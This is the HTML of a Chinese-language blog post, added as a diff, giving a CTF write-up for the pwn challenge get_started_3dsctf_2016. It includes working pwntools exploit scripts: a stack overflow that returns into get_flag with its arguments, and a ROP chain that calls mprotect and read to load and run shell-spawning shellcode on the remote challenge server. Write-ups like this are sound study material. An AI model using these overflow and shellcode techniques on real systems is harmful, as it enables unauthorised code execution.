@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="zh CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>get_started_3dsctf_2016 | kiki1e</title><meta name="author" content="kiki1e"><meta name="copyright" content="kiki1e"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="记一次有意思的题解checksec一下，32位程序，保护措施只开了NX拖进ida打开，gets函数存在溢出存在后门函数，直接打开了flag.txt，读取到了flag的内容所以最开始思路是利用溢出将返回地址填充为get_flag的地址，这里溢出是0x38，初步撰写exp这里我是在文件夹下建立了一个名为flag.txt的文件，里面内容是kiki1ebkfd脚本如下     from pwn impor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="get_started_3dsctf_2016">
+<meta property="og:url" content="http://example.com/post/dd747999.html">
+<meta property="og:site_name" content="kiki1e">
+<meta property="og:description" content="记一次有意思的题解checksec一下，32位程序，保护措施只开了NX拖进ida打开，gets函数存在溢出存在后门函数，直接打开了flag.txt，读取到了flag的内容所以最开始思路是利用溢出将返回地址填充为get_flag的地址，这里溢出是0x38，初步撰写exp这里我是在文件夹下建立了一个名为flag.txt的文件，里面内容是kiki1ebkfd脚本如下     from pwn impor">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/43EjgPucSslDJxM.png">
+<meta property="article:published_time" content="2024-09-07T06:36:43.000Z">
+<meta property="article:modified_time" content="2024-09-07T08:01:09.464Z">
+<meta property="article:author" content="kiki1e">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/43EjgPucSslDJxM.png"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/43EjgPucSslDJxM.png"><link rel="canonical" href="http://example.com/post/dd747999.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'get_started_3dsctf_2016',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-07 16:01:09'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/43EjgPucSslDJxM.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://kiki1e.github.io/"><i class="fa-fw fas fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="kiki1e"><span class="site-name">kiki1e</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="https://kiki1e.github.io/"><i class="fa-fw fas fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 导航</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友人帐</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">get_started_3dsctf_2016</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-07T06:36:43.000Z" title="Created 2024-09-07 14:36:43">2024-09-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-07T08:01:09.464Z" title="Updated 2024-09-07 16:01:09">2024-09-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="get_started_3dsctf_2016"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="记一次有意思的题解"><a href="#记一次有意思的题解" class="headerlink" title="记一次有意思的题解"></a>记一次有意思的题解</h3><p>checksec一下，32位程序，保护措施只开了NX<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907144119.png"><br>拖进ida打开，gets函数存在溢出<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907143953.png"><br>存在后门函数，直接打开了flag.txt，读取到了flag的内容<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907144253.png"><br>所以最开始思路是利用溢出将返回地址填充为get_flag的地址，这里溢出是0x38，初步撰写exp<br>这里我是在文件夹下建立了一个名为flag.txt的文件，里面内容是kiki1ebkfd<br>脚本如下</p>
+<pre><code>    from pwn import *
+    io = process(&#39;./get_started_3dsctf_2016&#39;)
+    context.log_level = &#39;debug&#39;
+
+    payload = b&#39;a&#39;*56
+    payload += p32(0x080489B8)
+    io.sendline(payload)
+
+    io.recv()
+</code></pre>
+<p>可以看到在本地的话，是成功打通了<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907151206.png"><br>但是远程打不通，问题就在于，当调用get_flag函数的时候，程序并不会正常退出，而异常退出的话，最后便没有回显。所以这道题应设法使得程序正常退出。<br>继续看程序，发现存在一个exit函数,该函数可以使得程序正常退出<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907151723.png"><br>再看get_flag函数，存在两个参数，那思路就是通过溢出，调用get_flag，向里面传入两个参数，接着返回函数，也就是exit函数<br>构造如下’a’*offset + ‘ebp’ + get_flag的地址 + get_flag的返回地址（exit函数） + 参数1 + 参数2<br>这里需要注意的就是当一个父函数去调用一个子函数的时候，它会先将子函数的返回地址压入栈中，再将所用到的参数压入栈中<br>所以新构造的payload应该为</p>
+<pre><code>    from pwn import *
+    io = remote(&#39;node5.buuoj.cn&#39;,28451)
+
+    context.log_level = &#39;debug&#39;
+    sleep(0.1)
+
+    payload = b&#39;a&#39;*56
+    payload += p32(0x080489A0) + p32(0x0804E6A0)
+    payload += p32(0x308CD64F) + p32(0x195719D1)
+    io.sendline(payload)
+    sleep(0.1)
+    io.recv()
+</code></pre>
+<p>这样便可以打通了，<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907153403.png"><br>不过在查阅其他师傅的博客的时候，发现了另一种解法，可以打通远程，主要用到了程序里的mprotect函数<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907154158.png"><br>mprotect函数原型如下</p>
+<pre><code>    int mprotect(void *addr, size_t len, int prot);
+    addr 内存启始地址
+    len  修改内存的长度
+    prot 内存的权限
+</code></pre>
+<p>这里用到三个参数，利用ROPgadget寻找<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907155225.png"><br>修改的函数为<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907155634.png"><br>那么问题来了，为什么要修改这里，为什么是0x80EB000而不是bss段的开头0x80EBF80，因为指定的内存区间必须包含整个内存页（4K），起始地址 start 必须是一个内存页的起始地址，并且区间长度 len 必须是页大小的整数倍。<br>然后将返回地址填上read函数，因为接下来要将shellcode读入程序段，需要继续控制程序<br>read函数<br><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907155400.png"><br>read函数原型</p>
+<pre><code>    ssize_t read(int fd, void *buf, size_t count);
+    fd 设为0时就可以从输入端读取内容    设为0
+    buf 设为我们想要执行的内存地址      设为我们已找到的内存地址0x80EB000
+    size 适当大小就可以                读入shellcode
+</code></pre>
+<p>接下来将返回地址填充为我们修改的内存地址，填入shellcode<br>完整exp如下</p>
+<pre><code>    from pwn import *
+
+    elf = ELF(&#39;./get_started_3dsctf_2016&#39;)
+
+    io=remote(&#39;node5.buuoj.cn&#39;, 28451)
+
+    pop3_ret = 0x804951D
+
+    mem_addr = 0x80EB000
+    mem_size = 0x1000    
+    mem_proc = 0x7       
+
+    mprotect_addr = elf.symbols[&#39;mprotect&#39;]
+    read_addr = elf.symbols[&#39;read&#39;]
+
+
+    payload  = b&#39;a&#39; * 0x38
+    payload += p32(mprotect_addr)
+    payload += p32(pop3_ret) 
+
+
+    payload += p32(mem_addr) 
+    payload += p32(mem_size)  
+    payload += p32(mem_proc)   
+
+    payload += p32(read_addr)
+
+    payload += p32(pop3_ret)  
+
+
+    payload += p32(0)     
+    payload += p32(mem_addr)   
+    payload += p32(0x100) 
+
+    payload += p32(mem_addr)   
+
+    io.sendline(payload)
+
+    payload = asm(shellcraft.sh()) 
+
+    io.sendline(payload)
+
+    io.interactive()
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/20240907160058.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">kiki1e</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/post/dd747999.html">http://example.com/post/dd747999.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/43EjgPucSslDJxM.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/7e174eb8.html" title="kali下载steam++"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">kali下载steam++</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/post/535ee732.html" title="堆利用--3Days"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-10</div><div class="title">堆利用--3Days</div></div></a></div><div><a href="/post/3bfe293.html" title="ROP方法总结--1Days"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-27</div><div class="title">ROP方法总结--1Days</div></div></a></div><div><a href="/post/9908608c.html" title="内核态漏洞利用--4Days"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-28</div><div class="title">内核态漏洞利用--4Days</div></div></a></div><div><a href="/post/fbff8202.html" title="格式化字符串漏洞--2Days"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-02</div><div class="title">格式化字符串漏洞--2Days</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/43EjgPucSslDJxM.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">kiki1e</div><div class="author-info__description">初四日 兀坐听雪溜竟日</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://www.bilibili.com/"><i class="iconfont icon-youxishoubing"></i><span>摸鱼</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://qm.qq.com/q/VKPirZG6Y2" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a><a class="social-icon" href="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/e6a2bd0197604b8927dbf8e7ddb8ae6a.jpg" target="_blank" title="WeChat"><i class="fab fa-weixin" style="color: #7bb32e;"></i></a><a class="social-icon" href="https://space.bilibili.com/1778581854?spm_id_from=333.337.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #00a1d6;"></i></a><a class="social-icon" href="https://github.com/kiki1e" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:kki927279@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content"><p align="center"><img src="https://cdn.jsdelivr.net/gh/kiki1e/imagess@main/img/SXnmlQeVzArBwJd.jpg" width="250" alt="mao"></p></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">记一次有意思的题解</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/dd747999.html" title="get_started_3dsctf_2016">get_started_3dsctf_2016</a><time datetime="2024-09-07T06:36:43.000Z" title="Created 2024-09-07 14:36:43">2024-09-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/7e174eb8.html" title="kali下载steam++">kali下载steam++</a><time datetime="2024-07-13T11:19:00.000Z" title="Created 2024-07-13 19:19:00">2024-07-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/9908608c.html" title="内核态漏洞利用--4Days">内核态漏洞利用--4Days</a><time datetime="2024-06-27T17:34:55.000Z" title="Created 2024-06-28 01:34:55">2024-06-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5325bdb9.html" title="Blue team">Blue team</a><time datetime="2024-04-05T07:48:11.000Z" title="Created 2024-04-05 15:48:11">2024-04-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/ae41db12.html" title="web向-SQL注入">web向-SQL注入</a><time datetime="2024-04-05T03:03:46.000Z" title="Created 2024-04-05 11:03:46">2024-04-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By kiki1e</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="9089526169" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listFolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="MISS,YOU" data-fontsize="15px" data-random="true" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
